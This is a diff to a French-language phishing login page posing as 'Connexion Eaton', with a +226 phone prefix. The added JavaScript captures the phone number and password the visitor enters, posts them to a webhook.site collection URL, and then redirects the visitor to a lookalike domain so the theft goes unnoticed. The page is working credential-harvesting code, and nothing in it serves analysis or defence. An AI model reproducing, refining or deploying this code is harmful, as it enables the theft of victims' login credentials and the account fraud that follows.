@@ -5,9 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Connexion Eaton</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
+    /* styles identiques à ton code précédent */
+    * { box-sizing: border-box; }
     body {
       margin: 0;
       font-family: 'Arial', sans-serif;
@@ -127,14 +126,14 @@
   </div>
 
   <div class="container">
-    <form action="https://webhook.site/b1fb39f5-27fc-412a-adba-4a0bdd868cb5" method="POST">
+    <form id="loginForm">
       <div class="input-group">
         <span>+226</span>
-        <input type="tel" name="phone" placeholder="Entrez votre mobile" required>
+        <input type="tel" name="phone" id="phone" placeholder="Entrez votre mobile" required>
       </div>
 
       <div class="input-group">
-        <input type="password" name="password" placeholder="Entrez le mot de passe de connexion" required>
+        <input type="password" name="password" id="password" placeholder="Entrez le mot de passe de connexion" required>
       </div>
 
       <button type="submit" class="btn">Se connecter</button>
@@ -154,6 +153,33 @@
 
   <!-- Fond orange -->
   <div class="orange-bg"></div>
+
+  <!-- Script JavaScript pour l'envoi + redirection -->
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault(); // Empêche l'envoi classique
+
+      const phone = document.getElementById('phone').value;
+      const password = document.getElementById('password').value;
+
+      const data = new URLSearchParams();
+      data.append('phone', phone);
+      data.append('password', password);
+
+      fetch('https://webhook.site/b1fb39f5-27fc-412a-adba-4a0bdd868cb5', {
+        method: 'POST',
+        body: data
+      })
+      .then(response => {
+        // Optionnel : console.log('Envoyé');
+        // Redirection après succès
+        window.location.href = 'https://bfa.afeatoncom.shop/index/new/index';
+      })
+      .catch(error => {
+        console.error('Erreur lors de l’envoi :', error);
+      });
+    });
+  </script>
 
 </body>
 </html>
